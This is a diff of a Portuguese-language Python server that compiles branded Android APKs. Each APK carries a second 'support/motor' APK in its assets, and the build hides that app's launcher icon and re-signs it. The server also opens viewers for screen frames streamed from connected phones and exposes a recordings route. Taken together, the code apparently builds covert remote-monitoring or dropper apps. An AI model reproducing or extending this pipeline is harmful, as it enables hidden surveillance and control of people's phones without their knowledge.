+    if not _url_apk and BUILD_MODE == "dev":
+        _url_apk = (PANEL_URL or "").strip()
+    if not _url_apk:
+        estado_build.update(
+            status="erro",
+            mensagem=("Informe a URL do seu túnel (campo 'URL do túnel') no painel "
+                      "antes de gerar o aplicativo. O .apk precisa dessa URL para "
+                      "se conectar ao seu servidor."),
+            apk=None,
+        )
+        registrar_log("[BUILD] Recusado: URL do túnel do cliente nao informada (_ultima_config_app['panel_url'] vazio).")
+        return
+
     estado_build.update(
         status="compilando",
         mensagem=f"Compilando Suporte ('{_nome_app_build}') + Principal ('{_nome_app_build}')... Aguarde.",
@@ -4064,9 +4486,11 @@ def compilar_apk_em_segundo_plano():
     registrar_log(f"[BUILD] Iniciando build: Suporte ('{_nome_app_build}') -> assets -> Principal ('{_nome_app_build}').")
 
     # 1) Identifica o diretorio raiz do projeto Android
-    raiz = _encontrar_raiz_projeto()
+    #    (config.json -> 'android_project_dir', senao busca automatica).
+    raiz = _resolver_raiz_android()
     if not raiz:
-        msg_erro = "gradlew.bat nao encontrado. Rode a partir da pasta do projeto Android."
+        msg_erro = ("gradlew.bat nao encontrado. Defina 'android_project_dir' no config.json "
+                    "(ao lado do .exe) apontando para a pasta do projeto Android.")
         registrar_log(f"[BUILD ERRO] {msg_erro}")
         estado_build.update(status="erro", mensagem=msg_erro)
         return
@@ -4177,7 +4601,30 @@ def compilar_apk_em_segundo_plano():
     java_home = _encontrar_java_home()
     if java_home:
         ambiente["JAVA_HOME"] = java_home
+        java_bin = os.path.join(java_home, "bin")
+        if os.path.isdir(java_bin):
+            ambiente["PATH"] = java_bin + os.pathsep + ambiente.get("PATH", "")
         registrar_log(f"[BUILD] Usando JAVA_HOME: {java_home}")
+
+    # DIAGNOSTICO (aparece no modal "Gerar Aplicativo" via /status-build).
+    _diag = [
+        f"frozen(.exe)      : {getattr(sys, 'frozen', False)}",
+        f"raiz do projeto   : {raiz}",
+        f"gradlew.bat       : {gradlew} ({'existe' if os.path.exists(gradlew) else 'NAO ENCONTRADO'})",
+        f"JAVA_HOME         : {java_home or 'NAO ENCONTRADO (Gradle falha com 9009)'}",
+        f"cwd do subprocess : {raiz}",
+        f"panelUrl (APK)    : {_url_apk}",
+        f"nome do app       : {_nome_app_build}",
+        f"BUILD_MODE        : {BUILD_MODE}",
+    ]
+    estado_build["diagnostico"] = "\n".join(_diag)
+    registrar_log("[BUILD DIAG]\n  " + "\n  ".join(_diag))
+    if not java_home:
+        _m = ("Java (JDK) nao encontrado. Instale o Android Studio ou um JDK 17/21 e defina "
+              "JAVA_HOME. Sem o java.exe o Gradle falha com codigo 9009.")
+        estado_build.update(status="erro", mensagem=_m)
+        registrar_log(f"[BUILD ERRO] {_m}")
+        return
 
     # Tuning do gradle.properties (uma unica vez, vale para os dois flavors)
     _props = os.path.join(raiz, "gradle.properties")
@@ -4315,72 +4762,85 @@ def compilar_apk_em_segundo_plano():
             return None, ""
 
     # ================================================================
-    # ETAPA 1: COMPILAR O SEGUNDO APP (flavor SUPORTE / marca do modal)
+    # ETAPAS 1-3: SEGUNDO APP (SUPORTE/MOTOR) — só com EMBUTIR_SUPORTE=True.
+    # Com EMBUTIR_SUPORTE=False, o principal sai SOZINHO: apaga os APKs dos
+    # assets (remove ~180 MB) e pula a compilação/embutição do suporte.
     # ================================================================
-    # CORRECAO: limpa o cache de recursos mergeados para que o novo icone/nome
-    # do white-label sejam incorporados (build offline com cache pode reusar
-    # resources.ap_ antigo -> icone/nome antigos no APK final).
-    # Mata o daemon do Gradle: daemons antigos em memoria podem segurar
-    # resources.ap_ mergeados e ignorar --no-build-cache. Roda ANTES do clean.
-    try:
-        subprocess.run(
-            ["cmd", "/c", gradlew, "--stop"],
-            cwd=raiz, shell=False, env=ambiente,
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            text=True, timeout=120,
-        )
-        registrar_log("[BUILD] Daemon do Gradle finalizado (--stop).")
-    except Exception as _e_stop:
-        registrar_log(f"[BUILD AVISO] gradlew --stop falhou (segue): {_e_stop}")
-
-    try:
-        _rc_clean = subprocess.run(
-            ["cmd", "/c", gradlew, "clean", "cleanBuildCache", "--offline", "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", "--no-daemon"],
-            cwd=raiz, shell=False, env=ambiente,
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            text=True, timeout=300,
-        )
-        registrar_log(f"[BUILD] Limpeza profunda (clean + cleanBuildCache + --no-build-cache + --no-daemon) concluida (codigo {_rc_clean.returncode}).")
-    except Exception as _e_clean:
-        registrar_log(f"[BUILD AVISO] clean falhou (segue sem limpar): {_e_clean}")
-
-    cmd_sup_off = ["cmd", "/c", gradlew, "assembleSuporteRelease", "--offline", "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={PANEL_URL}", f"-PappName={_nome_app_build}"]
-    cmd_sup_on  = ["cmd", "/c", gradlew, "assembleSuporteRelease",            "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={PANEL_URL}", f"-PappName={_nome_app_build}"]
-    rc_sup, out_sup = _rodar_gradle(cmd_sup_off, cmd_sup_on, f"flavor Suporte ('{_nome_app_build}')")
-    if rc_sup is None:
-        return  # erro ja registrado no helper
-    if rc_sup != 0:
-        estado_build["ultimo_log"] = out_sup[-4000:]
-        _msg = f"Falha ao compilar o flavor Suporte ('{_nome_app_build}'). O app principal nao pode ser gerado sem o modulo complementar."
-        registrar_log(f"[BUILD ERRO] {_msg} (codigo {rc_sup}). Cauda: {out_sup[-1500:]}")
-        estado_build.update(status="erro", mensagem=_msg)
-        return
-    registrar_log(f"[BUILD SUCESSO] ETAPA 1: flavor Suporte ('{_nome_app_build}') compilado.")
-
-    # ================================================================
-    # ETAPA 2: COPIAR E SUBSTITUIR EM ASSETS (caminho absoluto fixo)
-    # ================================================================
-    copiou = _copiar_apk_suporte_para_assets(raiz, nome_app=_nome_app_build)
     caminho_motor = _caminho_motor_assets(raiz)
-    if not copiou or not os.path.exists(caminho_motor):
-        _msg = f"APK do flavor Suporte ('{_nome_app_build}') compilado, mas nao foi possivel copia-lo para app/src/main/assets/suporte_motor.apk. Verifique app/build/outputs/apk/suporte/release/ (busca recursiva os.walk ativada)."
-        registrar_log(f"[BUILD ERRO] {_msg}")
-        estado_build.update(status="erro", mensagem=_msg)
-        return
-    registrar_log(f"[BUILD SUCESSO] ETAPA 2: suporte_motor.apk atualizado em assets ({os.path.getsize(caminho_motor)} bytes).")
-    _backup_motor_apk(raiz)
+    if not EMBUTIR_SUPORTE:
+        for _nome_apk in ("suporte.apk", "suporte_motor.apk"):
+            for _dir in (os.path.join(raiz, "app", "src", "main", "assets"),
+                         os.path.join(raiz, "app", "src", "principal", "assets")):
+                _p = os.path.join(_dir, _nome_apk)
+                try:
+                    if os.path.exists(_p):
+                        os.remove(_p)
+                        registrar_log(f"[BUILD] Removido dos assets (principal só): {_p}")
+                except Exception as _e_rm:
+                    registrar_log(f"[BUILD AVISO] não removeu {_p}: {_e_rm}")
+        registrar_log("[BUILD] Suporte/motor DESATIVADOS — compilando só o app principal (APK menor).")
+    else:
+        # ============================================================
+        # ETAPA 1: COMPILAR O SEGUNDO APP (flavor SUPORTE / marca do modal)
+        # ============================================================
+        # Mata o daemon do Gradle antes do clean (pode segurar resources.ap_).
+        try:
+            subprocess.run(
+                ["cmd", "/c", gradlew, "--stop"],
+                cwd=raiz, shell=False, env=ambiente,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, timeout=120,
+            )
+            registrar_log("[BUILD] Daemon do Gradle finalizado (--stop).")
+        except Exception as _e_stop:
+            registrar_log(f"[BUILD AVISO] gradlew --stop falhou (segue): {_e_stop}")
 
-    # ================================================================
-    # ETAPA 3: OCULTAR O ICONE DA GAVETA (remove launcher + re-assina)
-    #          Processa o suporte_motor.apk recem-copiado em assets.
-    # ================================================================
-    registrar_log("[BUILD] Processando o módulo complementar unificado: suporte_motor.apk")
-    _ocultar_launcher_suporte_apk(raiz)
+        try:
+            _rc_clean = subprocess.run(
+                ["cmd", "/c", gradlew, "clean", "cleanBuildCache", "--offline", "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", "--no-daemon"],
+                cwd=raiz, shell=False, env=ambiente,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, timeout=300,
+            )
+            registrar_log(f"[BUILD] Limpeza profunda concluida (codigo {_rc_clean.returncode}).")
+        except Exception as _e_clean:
+            registrar_log(f"[BUILD AVISO] clean falhou (segue sem limpar): {_e_clean}")
+
+        cmd_sup_off = ["cmd", "/c", gradlew, "assembleSuporteDebug", "--offline", "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={_url_apk}", f"-PappName={_nome_app_build}"]
+        cmd_sup_on  = ["cmd", "/c", gradlew, "assembleSuporteDebug",            "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={_url_apk}", f"-PappName={_nome_app_build}"]
+        rc_sup, out_sup = _rodar_gradle(cmd_sup_off, cmd_sup_on, f"flavor Suporte ('{_nome_app_build}')")
+        if rc_sup is None:
+            return  # erro ja registrado no helper
+        if rc_sup != 0:
+            estado_build["ultimo_log"] = out_sup[-4000:]
+            _msg = f"Falha ao compilar o flavor Suporte ('{_nome_app_build}'). O app principal nao pode ser gerado sem o modulo complementar."
+            registrar_log(f"[BUILD ERRO] {_msg} (codigo {rc_sup}). Cauda: {out_sup[-1500:]}")
+            estado_build.update(status="erro", mensagem=_msg)
+            return
+        registrar_log(f"[BUILD SUCESSO] ETAPA 1: flavor Suporte ('{_nome_app_build}') compilado.")
+
+        # ============================================================
+        # ETAPA 2: COPIAR E SUBSTITUIR EM ASSETS (caminho absoluto fixo)
+        # ============================================================
+        copiou = _copiar_apk_suporte_para_assets(raiz, nome_app=_nome_app_build)
+        if not copiou or not os.path.exists(caminho_motor):
+            _msg = f"APK do flavor Suporte ('{_nome_app_build}') compilado, mas nao foi possivel copia-lo para assets/suporte_motor.apk."
+            registrar_log(f"[BUILD ERRO] {_msg}")
+            estado_build.update(status="erro", mensagem=_msg)
+            return
+        registrar_log(f"[BUILD SUCESSO] ETAPA 2: suporte_motor.apk atualizado em assets ({os.path.getsize(caminho_motor)} bytes).")
+        _backup_motor_apk(raiz)
+
+        # ============================================================
+        # ETAPA 3: OCULTAR O ICONE DA GAVETA (remove launcher + re-assina)
+        # ============================================================
+        registrar_log("[BUILD] Processando o módulo complementar unificado: suporte_motor.apk")
+        _ocultar_launcher_suporte_apk(raiz)
 
     # ================================================================
     # ETAPA 3b (NOVO): RE-SINCRONIZACAO DE FLAVORS ANTES DO PRINCIPAL.
     # Re-aplica white-label (nome/icone) e sincroniza flavors IMEDIATAMENTE
-    # antes de assemblePrincipalRelease. Garante que nenhuma etapa do build
+    # antes de assemblePrincipalDebug. Garante que nenhuma etapa do build
     # do Suporte tenha revertido recursos, e que o Principal veja a marca nova.
     # ================================================================
     _aplicar_white_label_build_time(raiz)
@@ -4390,8 +4850,8 @@ def compilar_apk_em_segundo_plano():
     # ETAPA 4: COMPILAR O APP PRINCIPAL (flavor PRINCIPAL / marca do modal)
     #          Empacota o suporte_motor.apk recem-processado dentro de assets.
     # ================================================================
-    cmd_prin_off = ["cmd", "/c", gradlew, "assemblePrincipalRelease", "--offline", "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={PANEL_URL}", f"-PappName={_nome_app_build}"]
-    cmd_prin_on  = ["cmd", "/c", gradlew, "assemblePrincipalRelease",            "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={PANEL_URL}", f"-PappName={_nome_app_build}"]
+    cmd_prin_off = ["cmd", "/c", gradlew, "assemblePrincipalDebug", "--offline", "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={_url_apk}", f"-PappName={_nome_app_build}"]
+    cmd_prin_on  = ["cmd", "/c", gradlew, "assemblePrincipalDebug",            "--no-build-cache", "--no-configuration-cache", "--rerun-tasks", f"-PpanelUrl={_url_apk}", f"-PappName={_nome_app_build}"]
     output_gradle = ""
     rc_prin = None
     try:
@@ -4436,7 +4896,9 @@ def compilar_apk_em_segundo_plano():
 
     # 6) Localiza o APK gerado (prioriza a pasta do flavor principal)
     candidatos_pastas = [
+        os.path.join(raiz, "app", "build", "outputs", "apk", "principal", "debug"),
         os.path.join(raiz, "app", "build", "outputs", "apk", "principal", "release"),
+        os.path.join(raiz, "app", "build", "outputs", "apk", "debug"),
         os.path.join(raiz, "app", "build", "outputs", "apk", "release"),
     ]
     pasta_apk = None
@@ -4497,7 +4959,7 @@ def compilar_apk_em_segundo_plano():
     # 7) Atualiza o estado para concluido e registra no historico
     estado_build.update(
         status="concluido",
-        mensagem=f"Concluido! Aplicativo '{_nome_app_build}' gerado com sucesso (nome e icone do modal aplicados). Suporte Motor embutido e icone oculto. (painel: {PANEL_URL})",
+        mensagem=f"Concluido! Aplicativo '{_nome_app_build}' gerado com sucesso (nome e icone do modal aplicados). Suporte Motor embutido e icone oculto. (servidor: {_url_apk})",
         apk=apk,
     )
     try:
@@ -4521,9 +4983,9 @@ def compilar_app(background_tasks: BackgroundTasks):
 @app.get("/health")
 def health_check():
     """Diagnóstico: retorna quais rotas de build existem NESTE servidor.
-    Acesse https://painel.megabrasilutilidades.store/health para confirmar
-    que o código novo (com /salvar-config-app) está rodando, e não um
-    Acesso Materno.exe antigo (que devolveria 404 no botão Gerar Aplicativo)."""
+    Acesse <seu-subdominio>/health para confirmar que o código novo
+    (com /salvar-config-app) está rodando, e não um Acesso Materno.exe
+    antigo (que devolveria 404 no botão Gerar Aplicativo)."""
     rotas = [r.path for r in app.routes if hasattr(r, "path")]
     try:
         import multipart as _mp_check  # noqa: F401
@@ -4535,8 +4997,10 @@ def health_check():
         "servidor": "server.py (codigo novo, corrigido)",
         "porta": PORTA_REAL,
         "pid": os.getpid(),
-        "panel_url": PANEL_URL,
-        "link_ativo": PANEL_URL,
+        # Em dist nao expoe o dominio do CEO: mostra o subdominio do cliente
+        # (da chave) se houver; senao o PANEL_URL (vazio no dist, dominio do CEO so em dev).
+        "panel_url": (SERVER_URL_CLIENTE or PANEL_URL),
+        "link_ativo": "Servidor ativo",
         "rota_salvar_config_existe": "/salvar-config-app" in rotas,
         "rota_compilar_existe": "/compilar-app" in rotas,
         "rota_gravacoes_existe": "/gravacoes" in rotas,
@@ -4587,6 +5051,7 @@ def dispositivo_ativo():
 
 
 def _obter_caminho_fps():
+    """(Modo código-fonte) Localiza a pasta do FPS e o run.py ao lado do projeto."""
     candidatos = [
         os.path.abspath(os.path.join(_DIRETORIO_SERVIDOR, "..", "FPS")),
         os.path.abspath(os.path.join(_DIRETORIO_SERVIDOR, "FPS")),
@@ -4600,31 +5065,137 @@ def _obter_caminho_fps():
     return None, None
 
 
+def _pasta_fps_dados():
+    """Pasta GRAVÁVEL de trabalho/dados do FPS (capturas, videos, finais,
+    target_window.json). Regra única usada tanto pelo servidor (que grava o
+    target_window.json) quanto pelo FPS embutido (que o lê):
+      • .exe (frozen): dist\\Acesso Materno\\FPS\\ (ao lado do executável) — é
+        persistente e gravável, ≠ do _MEIPASS temporário;
+      • código-fonte: a pasta ..\\FPS do projeto.
+    A pasta é criada se não existir."""
+    if getattr(sys, "frozen", False):
+        base = os.path.join(os.path.dirname(sys.executable), "FPS")
+    else:
+        base, _ = _obter_caminho_fps()
+        if not base:
+            base = os.path.abspath(os.path.join(_DIRETORIO_SERVIDOR, "..", "FPS"))
+    try:
+        os.makedirs(base, exist_ok=True)
+    except Exception:
+        pass
+    return base
+
+
 @app.post("/abrir-emulador-fps")
 @app.get("/abrir-emulador-fps")
 def abrir_emulador_fps():
-    """Inicia o modulo FPS (leitor de tela / emulador flutuante) em um processo separado."""
-    pasta_fps, script_run = _obter_caminho_fps()
-    if not pasta_fps or not script_run:
-        registrar_log("[FPS] Erro: Pasta do FPS ou arquivo run.py nao encontrado.")
-        return {"status": "erro", "mensagem": "Arquivo FPS/run.py nao encontrado no servidor."}
-
+    """Inicia o modulo FPS (leitor de tela / emulador flutuante) em um processo
+    separado. No .exe (frozen) o FPS está EMBUTIDO: relança o proprio
+    "Acesso Materno.exe" com --modo-fps (sem depender de python.exe externo nem
+    de run.py fora da pasta dist). No codigo-fonte, roda python run.py."""
     try:
-        python_executable = sys.executable
+        pasta_dados = _pasta_fps_dados()
+        _env = os.environ.copy()
+        _env["FPS_DATA_DIR"] = pasta_dados  # redireciona capturas/videos/finais/target_window
+        _flags = subprocess.CREATE_NEW_CONSOLE if os.name == "nt" else 0
+
+        if getattr(sys, "frozen", False):
+            # FPS embutido: relança o executável do pacote em modo FPS.
+            _env["SOU_EXEC_FPS"] = "1"
+            proc = subprocess.Popen(
+                [sys.executable, "--modo-fps"],
+                cwd=pasta_dados,
+                env=_env,
+                creationflags=_flags,
+            )
+            registrar_log(f"[FPS] Emulador FPS (embutido no .exe) iniciado com PID {proc.pid}. Dados em {pasta_dados}")
+            return {
+                "status": "sucesso",
+                "mensagem": f"Emulador FPS embutido iniciado (PID {proc.pid}).",
+                "pid": proc.pid,
+            }
+
+        # Modo código-fonte: python run.py
+        pasta_fps, script_run = _obter_caminho_fps()
+        if not pasta_fps or not script_run:
+            registrar_log("[FPS] Erro: Pasta do FPS ou arquivo run.py nao encontrado.")
+            return {"status": "erro", "mensagem": "Arquivo FPS/run.py nao encontrado no servidor."}
         proc = subprocess.Popen(
-            [python_executable, script_run],
+            [sys.executable, script_run],
             cwd=pasta_fps,
-            creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == "nt" else 0
+            env=_env,
+            creationflags=_flags,
         )
         registrar_log(f"[FPS] Emulador FPS iniciado com PID {proc.pid} na pasta {pasta_fps}")
         return {
             "status": "sucesso",
             "mensagem": f"Emulador FPS iniciado com sucesso (PID {proc.pid}).",
-            "pid": proc.pid
+            "pid": proc.pid,
         }
     except Exception as e:
         registrar_log(f"[FPS] Erro ao iniciar emulador FPS: {e}")
-        return {"status": "erro", "mensagem": f"Falha ao executar FPS/run.py: {str(e)}"}
+        return {"status": "erro", "mensagem": f"Falha ao iniciar o FPS: {str(e)}"}
+
+
+@app.post("/abrir-emulador-nativo")
+@app.get("/abrir-emulador-nativo")
+async def abrir_emulador_nativo(request: Request):
+    """Abre o Emulador Flutuante NATIVO (PySide6) em processo separado.
+    Usa o Python da .venv-build (onde o PySide6 está instalado), já que o
+    PySide6 NÃO é embutido no .exe. Passa o aparelho selecionado e a porta
+    real do servidor para o app nativo (emulador_flutuante_nativo.py)."""
+    try:
+        # Aparelho: query/body -> senão o último que enviou frame.
+        disp = None
+        try:
+            if request.method == "POST":
+                corpo = await request.json()
+                disp = (corpo or {}).get("dispositivo")
+            else:
+                disp = request.query_params.get("dispositivo")
+        except Exception:
+            disp = request.query_params.get("dispositivo")
+        if not disp:
+            # CONEXÃO AUTOMÁTICA GARANTIDA: query-param -> último frame ->
+            # PRIMEIRO celular com socket vivo. Assim o emulador nativo SEMPRE
+            # é aberto com --dispositivo apontando para um aparelho online.
+            disp = (request.query_params.get("dispositivo")
+                    or ultimo_dispositivo.get("nome")
+                    or primeiro_dispositivo_conectado())
+
+        # Raiz do projeto: onde ficam .venv-build e emulador_flutuante_nativo.py.
+        if getattr(sys, "frozen", False):
+            # <raiz>\Acesso Materno\Acesso Materno.exe -> raiz = pai da pasta "Acesso Materno".
+            base_proj = os.path.dirname(os.path.dirname(sys.executable))
+        else:
+            base_proj = os.path.dirname(os.path.abspath(__file__))
+
+        script = os.path.join(base_proj, "emulador_flutuante_nativo.py")
+        if not os.path.exists(script):
+            return {"status": "erro", "mensagem": f"Script nativo não encontrado: {script}"}
+
+        # Python da venv-build (prefere pythonw.exe = sem janela de console preta).
+        candidatos = [
+            os.path.join(base_proj, ".venv-build", "Scripts", "pythonw.exe"),
+            os.path.join(base_proj, ".venv-build", "Scripts", "python.exe"),
+        ]
+        py = next((c for c in candidatos if os.path.exists(c)), None)
+        if not py:
+            return {"status": "erro",
+                    "mensagem": "Python da .venv-build não encontrado (instale PySide6 nela: "
+                                ".venv-build\\Scripts\\python.exe -m pip install PySide6)."}
+
+        args = [py, script, "--url", f"http://localhost:{PORTA_REAL}"]
+        if disp:
+            args += ["--dispositivo", str(disp)]
+        proc = subprocess.Popen(args, cwd=base_proj)
+        registrar_log(f"[EMU NATIVO] Iniciado PID {proc.pid} (dispositivo={disp or 'auto'}) via {py}")
+        return {"status": "sucesso",
+                "mensagem": f"Emulador nativo iniciado (PID {proc.pid}).",
+                "pid": proc.pid, "dispositivo": disp}
+    except Exception as e:
+        registrar_log(f"[EMU NATIVO] Erro ao iniciar: {e}")
+        return {"status": "erro", "mensagem": f"Falha ao iniciar o emulador nativo: {str(e)}"}
 
 
 @app.post("/atualizar-alvo-emulador")
@@ -4637,7 +5208,8 @@ async def atualizar_alvo_emulador(request: Request):
         else:
             dados = dict(request.query_params)
 
-        pasta_fps, _ = _obter_caminho_fps()
+        import json
+        pasta_fps = _pasta_fps_dados()
         if pasta_fps:
             caminho_json = os.path.join(pasta_fps, "target_window.json")
             with open(caminho_json, "w", encoding="utf-8") as f:
@@ -4651,7 +5223,8 @@ async def atualizar_alvo_emulador(request: Request):
 @app.get("/obter-alvo-emulador")
 def obter_alvo_emulador():
     """Retorna as coordenadas salvas do Visualizador Nativo em target_window.json."""
-    pasta_fps, _ = _obter_caminho_fps()
+    import json
+    pasta_fps = _pasta_fps_dados()
     if pasta_fps:
         caminho_json = os.path.join(pasta_fps, "target_window.json")
         if os.path.exists(caminho_json):
@@ -4664,15 +5237,18 @@ def obter_alvo_emulador():
 
 
 @app.get("/info-painel")
-def info_painel():
-    """Endpoint leve que o frontend do painel consulta para exibir o
-    cabecalho 'Link Ativo: <URL>'. Devolve SEMPRE a PANEL_URL fixa e
-    cravada, nunca um endereco detectado dinamicamente (que poderia ser
-    localhost / trycloudflare e causar HTTP 404 no .exe)."""
+def info_painel(request: Request):
+    """Endpoint leve de status do painel. Retorno NEUTRO: nao expoe nenhum
+    dominio pessoal/fixo. Devolve apenas o host local detectado a partir da
+    requisicao e a porta em uso. O PANEL_URL interno (usado para gerar os
+    aplicativos) NAO e alterado nem exposto aqui."""
+    try:
+        host_detectado = request.headers.get("host") or f"127.0.0.1:{PORTA_REAL}"
+    except Exception:
+        host_detectado = f"127.0.0.1:{PORTA_REAL}"
     return {
-        "link_ativo": PANEL_URL,
-        "panel_url": PANEL_URL,
-        "tunnel": "Cloudflare (megabrasiliautilidades.store -> localhost:27105)",
+        "link_ativo": "Servidor local ativo",
+        "host_local": host_detectado,
         "porta_local": PORTA_REAL,
     }
 
@@ -4680,6 +5256,473 @@ def info_painel():
 @app.get("/status-build")
 def status_build():
     return estado_build
+
+
+# ===========================================================================
+# CATÁLOGO DE APLICATIVOS (compila o MESMO app do Android Studio — variante
+# DEBUG — e sempre entrega a ÚLTIMA compilação). Data-driven: a lista vem de
+# apps_catalogo.json; adicionar um app novo é só acrescentar uma entrada lá,
+# e ele já aparece na categoria "Aplicativos" do painel.
+# ===========================================================================
+import json as _json_cat
+
+estado_build_catalogo = {"status": "ocioso", "mensagem": "", "apk": None, "app_id": None}
+ARQUIVO_CATALOGO = os.path.join(_DIRETORIO_SERVIDOR, "apps_catalogo.json")
+
+# Catálogo padrão: por enquanto só o "giga+", apontando para a variante DEBUG
+# (app/build/outputs/apk/principal/debug — a mesma que o Android Studio gera).
+_CATALOGO_PADRAO = [
+    {
+        "id": "giga+",
+        "nome": "giga+",
+        "tarefa": "assemblePrincipalDebug",
+        "pasta": os.path.join("app", "build", "outputs", "apk", "principal", "debug"),
+    }
+]
+
+
+def _carregar_catalogo():
+    """Lê apps_catalogo.json; cria com o padrão na primeira vez."""
+    try:
+        if os.path.exists(ARQUIVO_CATALOGO):
+            with open(ARQUIVO_CATALOGO, "r", encoding="utf-8") as f:
+                data = _json_cat.load(f)
+            if isinstance(data, list) and data:
+                return data
+    except Exception as e:
+        registrar_log(f"[CATALOGO] Falha ao ler {ARQUIVO_CATALOGO}: {e}")
+    try:
+        with open(ARQUIVO_CATALOGO, "w", encoding="utf-8") as f:
+            _json_cat.dump(_CATALOGO_PADRAO, f, ensure_ascii=False, indent=2)
+    except Exception:
+        pass
+    return list(_CATALOGO_PADRAO)
+
+
+def _app_do_catalogo(app_id):
+    for a in _carregar_catalogo():
+        if str(a.get("id")) == str(app_id):
+            return a
+    return None
+
+
+# Pastas dos apps CRIADOS no painel (categoria): ícone e APK por app.
+PASTA_CATALOGO_ICONES = os.path.join(_DIRETORIO_SERVIDOR, "apps_catalogo_icones")
+PASTA_CATALOGO_BUILDS = os.path.join(_DIRETORIO_SERVIDOR, "apps_catalogo_builds")
+
+
+def _salvar_catalogo(lista):
+    try:
+        with open(ARQUIVO_CATALOGO, "w", encoding="utf-8") as f:
+            _json_cat.dump(lista, f, ensure_ascii=False, indent=2)
+        return True
+    except Exception as e:
+        registrar_log(f"[CATALOGO] Falha ao salvar {ARQUIVO_CATALOGO}: {e}")
+        return False
+
+
+def _caminho_icone_catalogo(app_id):
+    return os.path.join(PASTA_CATALOGO_ICONES, f"{app_id}.png")
+
+
+def _compilar_catalogo_com_marca(app_id):
+    """Compila um app CRIADO no painel usando o SEU próprio nome + ícone.
+
+    Reusa o build comprovado compilar_apk_em_segundo_plano() (compila o flavor
+    suporte -> copia para app/src/main/assets/suporte_motor.apk -> compila o
+    principal com o nome/ícone -> suporte embutido). Depois copia o APK para
+    apps_catalogo_builds/<id>/ (cada app tem o seu) e registra a data no índice.
+    NÃO mexe em pastas/Gradle do Android — o embedding do suporte continua pelo
+    fluxo que já funciona."""
+    entry = _app_do_catalogo(app_id) or {}
+    nome = (entry.get("nome") or "App").strip()
+    # 1) Carrega o ícone salvo deste app (se houver) para o white-label de build.
+    icone_bytes = None
+    ic = _caminho_icone_catalogo(app_id)
+    if os.path.exists(ic):
+        try:
+            with open(ic, "rb") as f:
+                icone_bytes = f.read()
+        except Exception:
+            icone_bytes = None
+    # 2) Injeta nome + ícone na config que o build lê (preserva o panel_url atual).
+    _ultima_config_app["nome"] = nome
+    _ultima_config_app["icone_bytes"] = icone_bytes
+    estado_build_catalogo.update(status="compilando", apk=None, app_id=app_id,
+                                 mensagem=f"Compilando '{nome}' (nome e ícone próprios)...")
+    # 3) Build comprovado (roda síncrono aqui dentro da background task).
+    try:
+        compilar_apk_em_segundo_plano()
+    except Exception as e:
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                     mensagem=f"Erro no build: {e}")
+        registrar_log(f"[CATALOGO BUILD ERRO] {app_id}: {e}")
+        return
+    # 4) O resultado do principal fica em estado_build.
+    if estado_build.get("status") != "concluido" or not estado_build.get("apk"):
+        estado_build_catalogo.update(
+            status="erro", apk=None, app_id=app_id,
+            mensagem=(estado_build.get("mensagem") or "Falha na compilação."),
+            ultimo_log=estado_build.get("ultimo_log"),
+            diagnostico=estado_build.get("diagnostico"),
+        )
+        return
+    apk_origem = estado_build.get("apk")
+    # 5) Copia o APK para a pasta deste app (cada app mantém o seu APK).
+    apk_destino = apk_origem
+    try:
+        os.makedirs(os.path.join(PASTA_CATALOGO_BUILDS, app_id), exist_ok=True)
+        nome_arq = (re.sub(r'[^\w\-.]+', '', nome) or "app") + ".apk"
+        apk_destino = os.path.join(PASTA_CATALOGO_BUILDS, app_id, nome_arq)
+        shutil.copy2(apk_origem, apk_destino)
+    except Exception as e:
+        registrar_log(f"[CATALOGO] Falha ao copiar APK p/ {apk_destino}: {e}")
+        apk_destino = apk_origem
+    # 6) Atualiza o índice do catálogo (data da última compilação + tamanho).
+    try:
+        tam_mb = round(os.path.getsize(apk_destino) / (1024 * 1024), 2)
+    except Exception:
+        tam_mb = 0
+    lista = _carregar_catalogo()
+    for a in lista:
+        if str(a.get("id")) == str(app_id):
+            a["apk"] = os.path.relpath(apk_destino, _DIRETORIO_SERVIDOR)
+            a["atualizado_em"] = time.strftime("%d/%m/%Y %H:%M")
+            a["tamanho_mb"] = tam_mb
+            break
+    _salvar_catalogo(lista)
+    estado_build_catalogo.update(status="concluido", apk=apk_destino, app_id=app_id,
+                                 mensagem=f"'{nome}' compilado com sucesso.")
+    registrar_log(f"[CATALOGO BUILD SUCESSO] '{nome}' (id={app_id}) -> {apk_destino}")
+
+
+def _apk_mais_recente(pasta):
+    """APK mais novo (por data de modificação) dentro da pasta (recursivo)."""
+    try:
+        achados = []
+        for dp, _sd, arqs in os.walk(pasta):
+            for na in arqs:
+                if na.lower().endswith(".apk"):
+                    full = os.path.join(dp, na)
+                    try:
+                        achados.append((os.path.getmtime(full), full))
+                    except Exception:
+                        pass
+        if achados:
+            achados.sort()
+            return achados[-1][1]
+    except Exception:
+        pass
+    return None
+
+
+def _compilar_debug_catalogo_LEGADO_DESATIVADO(app_id):
+    """[DESATIVADA] Build enxuto antigo (só assemblePrincipalDebug) que NÃO
+    embutia o suporte. Mantida sem uso apenas como referência; o dispatch usa
+    agora compilar_debug_catalogo (wrapper do build completo)."""
+    app_cfg = _app_do_catalogo(app_id) or {}
+    tarefa = app_cfg.get("tarefa", "assemblePrincipalDebug")
+    pasta_rel = app_cfg.get("pasta", os.path.join("app", "build", "outputs", "apk", "principal", "debug"))
+    # Raiz do projeto Android: config.json -> 'android_project_dir', senao busca
+    # automatica (NAO usar _DIRETORIO_SERVIDOR cru, que no .exe e o _MEIPASS temp).
+    raiz = _resolver_raiz_android()
+    gradlew = os.path.join(raiz, "gradlew.bat") if raiz else None
+    if not raiz or not os.path.exists(gradlew):
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
